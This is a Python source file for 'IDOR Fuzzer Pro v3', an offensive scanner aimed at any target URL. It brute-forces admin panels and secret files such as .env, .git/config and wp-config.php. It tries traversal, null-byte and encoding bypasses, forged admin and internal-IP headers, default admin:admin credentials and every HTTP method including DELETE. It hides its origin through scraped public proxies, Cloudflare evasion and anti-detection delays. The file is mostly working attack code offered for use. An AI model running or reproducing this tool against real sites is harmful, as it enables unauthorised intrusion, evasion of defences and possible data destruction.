#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
IDOR Fuzzer Pro v3
Professional Red Team Path Discovery & Bypass Framework
Features:
- Auto proxy fetching & validation
- Cloudflare bypass
- Intelligent wordlist generation
- Multi-vector fuzzing (90+ payloads per path)
- Fake 404 detection
- Session hijacking detection
- Structured reporting (JSON/CSV/HTML)
"""

import sys
import time
import random
import string
import requests
import argparse
import json
import csv
import re
from urllib.parse import urljoin, urlparse, quote, unquote
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import threading

# === CONFIG ===
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
]

# Common admin paths for intelligent generation
COMMON_ADMIN_PATHS = [
    'admin', 'administrator', 'admin1', 'admin2', 'admin3', 'admin4', 'admin5',
    'moderator', 'webadmin', 'adminarea', 'bb-admin', 'adminLogin', 'admin_area',
    'panel-administracion', 'instadmin', 'memberadmin', 'administratorlogin',
    'adm', 'admin/account', 'admin/login', 'admin/home', 'admin/controlpanel',
    'admin/cp', 'cp', 'controlpanel', 'panel', 'panelc', 'modcp', 'staff', 'acp',
    'dashboard', 'backend', 'manager', 'manage', 'management', 'settings',
    'config', 'configuration', 'setup', 'install', 'installer', 'update', 'upgrade',
    'backup', 'backups', 'database', 'db', 'sql', 'dump', 'export', 'import',
    'logs', 'log', 'error', 'errors', 'debug', 'debugger', 'maintenance',
    'api', 'apis', 'api/v1', 'api/v2', 'rest', 'restapi', 'graphql',
    'internal', 'private', 'secret', 'hidden', 'dev', 'development', 'test', 'tests',
    'staging', 'stage', 'preview', 'demo', 'sandbox',
    'uploads', 'upload', 'files', 'documents', 'docs', 'downloads', 'download',
    'media', 'images', 'img', 'photos', 'pictures', 'assets',
    'user', 'users', 'account', 'accounts', 'profile', 'profiles', 'member', 'members',
    '.env', '.git', '.git/config', '.gitignore', '.htaccess', '.htpasswd',
    'robots.txt', 'sitemap.xml', 'sitemap', 'wp-config.php', 'wp-admin', 'wp-content',
    'phpinfo.php', 'info.php', 'server-info', 'server-status'
]

# === PROXY MANAGEMENT ===
class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.valid_proxies = []
        self.lock = threading.Lock()
        self.proxy_sources = [
            "https://api.proxyscrape.com/v2/?request=get&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
            "https://www.proxy-list.download/api/v1/get?type=http",
            "https://www.proxy-list.download/api/v1/get?type=https",
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt"
        ]
    
    def fetch_proxies(self):
        """Fetch proxies from multiple sources"""
        print("[+] Fetching proxies from public sources...")
        all_proxies = set()
        
        for source in self.proxy_sources:
            try:
                resp = requests.get(source, timeout=10)
                if resp.status_code == 200:
                    lines = resp.text.strip().split('\n')
                    for line in lines:
                        line = line.strip()
                        if ':' in line and len(line.split(':')) == 2:
                            all_proxies.add(line)
            except:
                continue
        
        self.proxies = list(all_proxies)
        print(f"[+] Fetched {len(self.proxies)} proxies")
        return self.proxies
    
    def validate_proxy(self, proxy, timeout=5):
        """Test if proxy is working"""
        try:
            proxies = {
                'http': f'http://{proxy}',
                'https': f'http://{proxy}'
            }
            resp = requests.get('https://httpbin.org/ip', proxies=proxies, timeout=timeout)
            if resp.status_code == 200:
                return True
        except:
            return False
    
    def validate_all(self, max_workers=20):
        """Validate all proxies concurrently"""
        print(f"[+] Validating {len(self.proxies)} proxies...")
        valid = []
        
        def test_proxy(p):
            if self.validate_proxy(p):
                with self.lock:
                    valid.append(p)
                    print(f"[+] Valid proxy: {p}")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            list(executor.map(test_proxy, self.proxies))
        
        self.valid_proxies = valid
        print(f"[+] Found {len(valid)} working proxies")
        return valid
    
    def get_random_proxy(self):
        """Get random valid proxy"""
        if not self.valid_proxies:
            return None
        return random.choice(self.valid_proxies)

# === CLOUDFLARE BYPASS ===
class CloudflareBypass:
    @staticmethod
    def get_cloudflare_headers():
        """Headers that mimic real browser to bypass Cloudflare"""
        return {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'DNT': '1',
            'Cache-Control': 'max-age=0'
        }
    
    @staticmethod
    def solve_cloudflare_challenge(session, url):
        """Attempt to bypass Cloudflare IUAM challenge"""
        try:
            resp = session.get(url, headers=CloudflareBypass.get_cloudflare_headers(), timeout=15)
            
            # Check if Cloudflare challenge present
            if 'cf_chl_jschl_answer' in resp.text or 'Just a moment' in resp.text:
                print(f"[!] Cloudflare challenge detected on {url}")
                # Simple delay to allow JS challenge to complete
                time.sleep(3)
                resp = session.get(url, headers=CloudflareBypass.get_cloudflare_headers(), timeout=15)
            
            return resp
        except:
            return None

# === INTELLIGENT RESPONSE ANALYSIS ===
class ResponseAnalyzer:
    @staticmethod
    def is_valid_response(resp, baseline_size, path):
        """Advanced detection: not just 200 OK, but actual content"""
        findings = []
        
        # Rule 1: Status code 200
        if resp.status_code == 200:
            findings.append({
                'type': 'direct_access',
                'severity': 'HIGH',
                'message': 'Direct access granted'
            })
        
        # Rule 2: Redirect to admin panel
        if resp.status_code in (301, 302, 307, 308):
            location = resp.headers.get('Location', '')
            if any(x in location.lower() for x in ['/admin', '/dashboard', '/control', 'login']):
                findings.append({
                    'type': 'redirect_to_admin',
                    'severity': 'HIGH',
                    'message': f'Redirects to: {location}',
                    'location': location
                })
        
        # Rule 3: Forbidden but content exists (bypassable)
        if resp.status_code == 403:
            forbidden_indicators = ['forbidden', 'access denied', 'not authorized', 'permission denied']
            text_lower = resp.text.lower()
            
            if not any(ind in text_lower for ind in forbidden_indicators):
                findings.append({
                    'type': 'bypassable_403',
                    'severity': 'MEDIUM',
                    'message': '403 with actual content - bypass possible'
                })
            elif any(x in text_lower for x in ['admin', 'dashboard', 'control panel']):
                findings.append({
                    'type': 'admin_content_in_403',
                    'severity': 'HIGH',
                    'message': 'Admin content visible despite 403'
                })
        
        # Rule 4: Fake 404 (size similar to real pages)
        if resp.status_code == 404:
            if baseline_size > 0 and abs(len(resp.content) - baseline_size) < 500:
                findings.append({
                    'type': 'fake_404',
                    'severity': 'MEDIUM',
                    'message': f'Fake 404 detected (size: {len(resp.content)} vs baseline: {baseline_size})'
                })
        
        # Rule 5: Error page with data leakage
        if resp.status_code >= 500:
            data_indicators = {
                'database_error': ['database', 'sql', 'query', 'mysql', 'postgresql', 'sqlite'],
                'config_leak': ['config', 'password', 'secret', 'api_key', 'token', 'credential'],
                'debug_info': ['stack trace', 'exception', 'error', 'warning', 'notice'],
                'file_path': ['/var/www', 'c:\\', '/home/', '/etc/']
            }
            
            text_lower = resp.text.lower()
            for leak_type, indicators in data_indicators.items():
                if any(ind in text_lower for ind in indicators):
                    findings.append({
                        'type': f'data_leak_{leak_type}',
                        'severity': 'CRITICAL' if leak_type in ['config_leak', 'database_error'] else 'HIGH',
                        'message': f'Data leakage detected: {leak_type}'
                    })
        
        # Rule 6: Session/cookie detection
        if 'set-cookie' in resp.headers:
            cookie = resp.headers['set-cookie'].lower()
            if any(x in cookie for x in ['session', 'auth', 'token', 'jwt', 'csrf']):
                findings.append({
                    'type': 'session_cookie',
                    'severity': 'INFO',
                    'message': 'Session cookie detected',
                    'cookie': resp.headers['set-cookie']
                })
        
        # Rule 7: Admin panel indicators in content
        admin_indicators = [
            'admin panel', 'control panel', 'dashboard', 'user management',
            'system settings', 'configuration', 'backup', 'database manager'
        ]
        if any(ind in resp.text.lower() for ind in admin_indicators):
            findings.append({
                'type': 'admin_content',
                'severity': 'HIGH',
                'message': 'Admin panel content detected'
            })
        
        return findings

# === BYPASS TECHNIQUES ===
class BypassGenerator:
    @staticmethod
    def generate_variants(path):
        """Generate 90+ bypass combinations for each path"""
        variants = set()
        
        # Base path
        variants.add(path)
        
        # 1. Case sensitivity variations
        variants.add(path.upper())
        variants.add(path.lower())
        variants.add(path.capitalize())
        variants.add(path.swapcase())
        
        # 2. URL encoding variations
        variants.add(quote(path))
        variants.add(path.replace('/', '%2F'))
        variants.add(path.replace('.', '%2E'))
        variants.add(path.replace('-', '%2D'))
        
        # 3. Double encoding
        variants.add(path.replace('/', '%252F'))
        variants.add(path.replace('.', '%252E'))
        
        # 4. Path traversal attempts
        variants.add(f"../{path}")
        variants.add(f"..%2F{path}")
        variants.add(f"..%252F{path}")
        variants.add(f"....//{path}")
        variants.add(f"..%5C{path}")  # Windows backslash
        variants.add(f"%2e%2e%2f{path}")
        
        # 5. Null byte injection
        variants.add(f"{path}%00")
        variants.add(f"{path}.jpg%00")
        variants.add(f"{path}.php%00")
        variants.add(f"{path}.html%00")
        
        # 6. Parameter pollution
        params = ['id=1', 'user=admin', 'debug=true', 'test=1', 'role=admin', 'action=view']
        for param in params:
            variants.add(f"{path}?{param}")
            variants.add(f"{path}&{param}")
            variants.add(f"{path};{param}")
        
        # 7. File extension tricks
        extensions = ['.php', '.html', '.htm', '.asp', '.aspx', '.jsp', '.jspx', 
                      '.json', '.xml', '.txt', '.bak', '.old', '.orig', '.zip']
        for ext in extensions:
            variants.add(f"{path}{ext}")
        
        # 8. Trailing slash variations
        if path.endswith('/'):
            variants.add(path.rstrip('/'))
        else:
            variants.add(f"{path}/")
            variants.add(f"{path}//")
        
        # 9. Dot tricks
        variants.add(f"{path}/.")
        variants.add(f"{path}/./")
        variants.add(f"{path}//")
        variants.add(f"{path}/../{path.split('/')[-1]}")
        
        # 10. Space and tab encoding
        variants.add(path.replace(' ', '%20'))
        variants.add(path.replace(' ', '+'))
        variants.add(path.replace(' ', '%09'))
        
        # 11. Unicode tricks
        variants.add(path.replace('/', '\\u002f'))
        variants.add(path.replace('.', '\\u002e'))
        
        return list(variants)
    
    @staticmethod
    def generate_header_sets(base_headers, target_host):
        """Generate header variations for bypass attempts"""
        header_sets = []
        
        # Base headers
        header_sets.append(base_headers.copy())
        
        # Add X-Forwarded-For variations (internal IPs)
        internal_ips = ['127.0.0.1', '10.0.0.1', '192.168.1.1', '172.16.0.1', '169.254.169.254']
        for ip in internal_ips:
            h = base_headers.copy()
            h['X-Forwarded-For'] = ip
            h['X-Real-IP'] = ip
            h['X-Client-IP'] = ip
            h['X-Forwarded-Host'] = target_host
            header_sets.append(h)
        
        # Add admin headers
        admin_headers_list = [
            {'X-Admin': 'true'},
            {'X-Admin': '1'},
            {'X-Admin': 'yes'},
            {'X-User-Role': 'admin'},
            {'X-User-Role': 'administrator'},
            {'X-Access-Level': '999'},
            {'X-Access-Level': 'superuser'},
            {'X-Internal': 'true'},
            {'X-Internal-Access': 'granted'},
            {'X-Custom-Admin': 'enabled'},
            {'X-System-Role': 'root'},
            {'X-Privilege': 'admin'},
            {'X-Auth-Bypass': 'true'},
            {'Referer': f'https://{target_host}/admin'},
            {'Referer': f'https://{target_host}/dashboard'},
            {'Origin': f'https://{target_host}'},
            {'X-Requested-With': 'XMLHttpRequest'},
            {'X-CSRF-Token': 'bypass'},
            {'Authorization': 'Bearer admin_token_123'},
            {'Authorization': 'Basic YWRtaW46YWRtaW4='}  # admin:admin base64
        ]
        
        for admin_h in admin_headers_list:
            h = base_headers.copy()
            h.update(admin_h)
            header_sets.append(h)
        
        return header_sets

# === HTTP METHOD FUZZING ===
class MethodFuzzer:
    METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT']
    
    @staticmethod
    def test_methods(session, url, headers, proxy=None):
        """Test all HTTP methods for bypass"""
        results = []
        proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'} if proxy else None
        
        for method in MethodFuzzer.METHODS:
            try:
                if method == 'GET':
                    resp = session.get(url, headers=headers, timeout=10, allow_redirects=False, proxies=proxies)
                elif method == 'POST':
                    resp = session.post(url, headers=headers, data={'test': 'data', 'admin': 'true'}, timeout=10, allow_redirects=False, proxies=proxies)
                elif method == 'PUT':
                    resp = session.put(url, headers=headers, data={'test': 'data'}, timeout=10, allow_redirects=False, proxies=proxies)
                elif method == 'DELETE':
                    resp = session.delete(url, headers=headers, timeout=10, allow_redirects=False, proxies=proxies)
                elif method == 'PATCH':
                    resp = session.patch(url, headers=headers, data={'test': 'data'}, timeout=10, allow_redirects=False, proxies=proxies)
                elif method == 'OPTIONS':
                    resp = session.options(url, headers=headers, timeout=10, allow_redirects=False, proxies=proxies)
                elif method == 'HEAD':
                    resp = session.head(url, headers=headers, timeout=10, allow_redirects=False, proxies=proxies)
                elif method == 'TRACE':
                    resp = session.request('TRACE', url, headers=headers, timeout=10, allow_redirects=False, proxies=proxies)
                elif method == 'CONNECT':
                    resp = session.request('CONNECT', url, headers=headers, timeout=10, allow_redirects=False, proxies=proxies)
                
                results.append({
                    'method': method,
                    'status': resp.status_code,
                    'size': len(resp.content),
                    'headers': dict(resp.headers),
                    'text_preview': resp.text[:200] if hasattr(resp, 'text') else ''
                })
            except:
                pass
        
        return results

# === MAIN FUZZER ===
class IDORFuzzerProV3:
    def __init__(self, target, wordlist=None, threads=15, delay=0.8, use_proxies=True, output='report'):
        self.target = target.rstrip('/')
        self.threads = threads
        self.delay = delay
        self.use_proxies = use_proxies
        self.output_base = output
        self.session = requests.Session()
        self.session.headers.update(CloudflareBypass.get_cloudflare_headers())
        
        # Initialize proxy manager
        self.proxy_manager = ProxyManager() if use_proxies else None
        self.current_proxy = None
        
        # Get baseline response size
        self.baseline_size = self.get_baseline_size()
        
        # Load or generate wordlist
        self.paths = self.load_wordlist(wordlist)
        
        # Results storage
        self.results = []
        self.total_requests = 0
        self.start_time = None
    
    def get_baseline_size(self):
        """Get baseline 404 page size"""
        try:
            resp = CloudflareBypass.solve_cloudflare_challenge(self.session, f"{self.target}/nonexistentpage_{random.randint(100000,999999)}")
            if resp:
                return len(resp.content)
        except:
            pass
        return 0
    
    def load_wordlist(self, wordlist_file):
        """Load wordlist or generate intelligent paths"""
        paths = set()
        
        if wordlist_file:
            try:
                with open(wordlist_file, 'r') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            paths.add(line)
            except:
                pass
        
        # Always add common admin paths
        paths.update(COMMON_ADMIN_PATHS)
        
        # Generate intelligent paths based on target
        domain = urlparse(self.target).netloc
        if 'admin' not in domain.lower():
            paths.add('admin')
            paths.add('administrator')
        
        return sorted(list(paths))
    
    def get_session_with_proxy(self):
        """Get session with random proxy"""
        if self.use_proxies and self.proxy_manager and self.proxy_manager.valid_proxies:
            proxy = self.proxy_manager.get_random_proxy()
            if proxy:
                self.current_proxy = proxy
                return self.session, proxy
        return self.session, None
    
    def test_path(self, path):
        """Test a single path with all bypass techniques"""
        findings = []
        
        # Generate bypass variants (90+ combinations)
        variants = BypassGenerator.generate_variants(path)
        
        for variant in variants:
            url = urljoin(f"{self.target}/", variant.lstrip('/'))
            
            # Get session with proxy
            session, proxy = self.get_session_with_proxy()
            
            # Generate header sets
            header_sets = BypassGenerator.generate_header_sets(
                session.headers.copy(), 
                urlparse(self.target).netloc
            )
            
            for headers in header_sets:
                # Test with different HTTP methods
                method_results = MethodFuzzer.test_methods(session, url, headers, proxy)
                
                for result in method_results:
                    self.total_requests += 1
                    
                    # Create mock response object for analysis
                    class MockResp:
                        def __init__(self, r):
                            self.status_code = r['status']
                            self.text = r.get('text_preview', '')
                            self.content = b'x' * r['size']
                            self.headers = r['headers']
                    
                    mock_resp = MockResp(result)
                    
                    # Analyze response
                    analysis = ResponseAnalyzer.is_valid_response(mock_resp, self.baseline_size, path)
                    
                    if analysis:
                        finding = {
                            'url': url,
                            'method': result['method'],
                            'status': result['status'],
                            'size': result['size'],
                            'findings': analysis,
                            'proxy_used': proxy,
                            'timestamp': datetime.now().isoformat()
                        }
                        findings.append(finding)
                        
                        # Print immediately with color coding
                        severity = max([f['severity'] for f in analysis])
                        color = '\033[91m' if severity == 'CRITICAL' else '\033[93m' if severity == 'HIGH' else '\033[92m'
                        print(f"{color}[{severity}] {result['method']} {url} → {result['status']} ({result['size']} bytes){severity}\033[0m")
                        
                        # Save to file immediately
                        self.save_finding(finding)
                
                # Anti-detection delay
                time.sleep(self.delay + random.uniform(0, 0.5))
        
        return findings
    
    def save_finding(self, finding):
        """Save finding to JSON file"""
        try:
            with open(f'{self.output_base}.json', 'a') as f:
                json.dump(finding, f, ensure_ascii=False)
                f.write('\n')
        except:
            pass
    
    def generate_report(self):
        """Generate comprehensive report"""
        # JSON report
        with open(f'{self.output_base}.json', 'w') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)
        
        # CSV report
        with open(f'{self.output_base}.csv', 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['URL', 'Method', 'Status', 'Size', 'Severity', 'Finding Type', 'Message'])
            for result in self.results:
                for finding in result['findings']:
                    writer.writerow([
                        result['url'],
                        result['method'],
                        result['status'],
                        result['size'],
                        finding['severity'],
                        finding['type'],
                        finding['message']
                    ])
        
        # HTML report
        html = f"""
        <!DOCTYPE html>
        <html>
        <head>
            <title>IDOR Fuzzer Pro v3 Report - {self.target}</title>
            <style>
                body {{ font-family: Arial, sans-serif; margin: 20px; }}
                h1 {{ color: #e74c3c; }}
                .critical {{ color: #c0392b; font-weight: bold; }}
                .high {{ color: #e67e22; font-weight: bold; }}
                .medium {{ color: #f39c12; }}
                .info {{ color: #3498db; }}
                table {{ border-collapse: collapse; width: 100%; margin-top: 20px; }}
                th, td {{ border: 1px solid #ddd; padding: 8px; text-align: left; }}
                th {{ background-color: #f2f2f2; }}
            </style>
        </head>
        <body>
            <h1>IDOR Fuzzer Pro v3 Report</h1>
            <p><strong>Target:</strong> {self.target}</p>
            <p><strong>Scan Time:</strong> {self.start_time.strftime('%Y-%m-%d %H:%M:%S')}</p>
            <p><strong>Total Requests:</strong> {self.total_requests}</p>
            <p><strong>Findings:</strong> {len(self.results)}</p>
            
            <table>
                <tr>
                    <th>Severity</th>
                    <th>URL</th>
                    <th>Method</th>
                    <th>Status</th>
                    <th>Size</th>
                    <th>Type</th>
                    <th>Message</th>
                </tr>
        """
        
        for result in self.results:
            for finding in result['findings']:
                severity_class = finding['severity'].lower()
                html += f"""
                <tr>
                    <td class="{severity_class}">{finding['severity']}</td>
                    <td><a href="{result['url']}">{result['url']}</a></td>
                    <td>{result['method']}</td>
                    <td>{result['status']}</td>
                    <td>{result['size']}</td>
                    <td>{finding['type']}</td>
                    <td>{finding['message']}</td>
                </tr>
                """
        
        html += """
            </table>
        </body>
        </html>
        """
        
        with open(f'{self.output_base}.html', 'w', encoding='utf-8') as f:
            f.write(html)
        
        print(f"\n[+] Reports generated:")
        print(f"    - JSON: {self.output_base}.json")
        print(f"    - CSV: {self.output_base}.csv")
        print(f"    - HTML: {self.output_base}.html")
    
    def run(self):
        print(f"\033[94m[+] IDOR Fuzzer Pro v3 - Starting scan on: {self.target}\033[0m")
        print(f"[+] Baseline response size: {self.baseline_size} bytes")
        print(f"[+] Using {self.threads} threads")
        print(f"[+] Proxy support: {'Enabled' if self.use_proxies else 'Disabled'}")
        
        # Initialize proxies if enabled
        if self.use_proxies:
            self.proxy_manager.fetch_proxies()
            self.proxy_manager.validate_all(max_workers=30)
            if not self.proxy_manager.valid_proxies:
                print("[!] No valid proxies found. Continuing without proxies.")
                self.use_proxies = False
        
        print(f"[+] Loaded {len(self.paths)} paths to test\n")
        
        self.start_time = datetime.now()
        
        # Execute with thread pool
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.test_path, path): path for path in self.paths}
            
            for future in as_completed(futures):
                try:
                    results = future.result()
                    self.results.extend(results)
                except Exception as e:
                    pass
        
        # Generate final report
        self.generate_report()
        
        # Final statistics
        end_time = datetime.now()
        duration = (end_time - self.start_time).total_seconds()
        
        print(f"\n\033[94m[+] Scan complete!\033[0m")
        print(f"[+] Duration: {duration:.2f} seconds")
        print(f"[+] Total requests sent: {self.total_requests}")
        print(f"[+] Valid findings: {len(self.results)}")
        
        # Severity breakdown
        severity_counts = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'INFO': 0}
        for result in self.results:
            for finding in result['findings']:
                severity = finding['severity']
                if severity in severity_counts:
                    severity_counts[severity] += 1
        
        print(f"\n[+] Severity breakdown:")
        for severity, count in severity_counts.items():
            if count > 0:
                print(f"    {severity}: {count}")

# === CLI ===
def main():
    parser = argparse.ArgumentParser(description='IDOR Fuzzer Pro v3 - Professional Path Discovery & Bypass')
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g., https://example.com)')
    parser.add_argument('-w', '--wordlist', help='Wordlist file with paths (optional - uses built-in if not provided)')
    parser.add_argument('-t', '--threads', type=int, default=15, help='Number of threads (default: 15)')
    parser.add_argument('-d', '--delay', type=float, default=0.8, help='Delay between requests in seconds (default: 0.8)')
    parser.add_argument('--no-proxy', action='store_true', help='Disable automatic proxy fetching')
    parser.add_argument('-o', '--output', default='idor_report', help='Output file base name (default: idor_report)')
    
    args = parser.parse_args()
    
    fuzzer = IDORFuzzerProV3(
        target=args.url,
        wordlist=args.wordlist,
        threads=args.threads,
        delay=args.delay,
        use_proxies=not args.no_proxy,
        output=args.output
    )
    
    fuzzer.run()

if __name__ == "__main__":
    main()

